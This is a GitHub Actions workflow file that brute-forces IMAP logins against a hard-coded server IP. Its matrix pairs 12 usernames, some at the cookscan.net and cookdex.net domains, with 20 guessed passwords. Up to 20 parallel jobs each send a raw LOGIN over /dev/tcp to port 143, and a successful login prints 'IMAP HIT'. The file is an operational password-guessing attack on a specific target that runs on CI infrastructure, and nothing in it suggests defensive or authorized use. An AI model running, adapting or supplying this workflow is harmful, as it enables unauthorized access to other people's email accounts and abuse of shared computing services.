name: imap
on:
  workflow_dispatch:
    inputs:
      target: { default: '74.208.88.23' }
jobs:
  imap:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 20
      matrix:
        user: ["admin","revan","rev1853","zahhid","info","support","cookscan","admin@cookscan.net","revan@cookscan.net","info@cookscan.net","admin@cookdex.net","postmaster@cookscan.net"]
        pw: ["admin","revan","revan123","rev1853","cookscan","cookiescan","bigbangx","bigbangxadmin","dosecret","garuda","nexora","Plesk123","admin123","Password1","changeme","secret","letmein","qwerty123","cookie123","dungeon"]
    steps:
      - name: imap ${{ matrix.user }} / ${{ matrix.pw }}
        run: |
          set +e
          r=$(timeout 20 bash -c "exec 3<>/dev/tcp/${{ inputs.target }}/143; printf 'a1 LOGIN ${{ matrix.user }} ${{ matrix.pw }}\r\n' >&3; sleep 3; head -c 300 <&3" 2>/dev/null | tr -d '\r' | grep -oE 'a1 (OK|NO)' | head -1)
          if [ "$r" = "a1 OK" ]; then echo "*** IMAP HIT ${{ matrix.user }} / ${{ matrix.pw }}"; else echo "    miss ${{ matrix.user }} / ${{ matrix.pw }} -> ${r:-noresp}"; fi
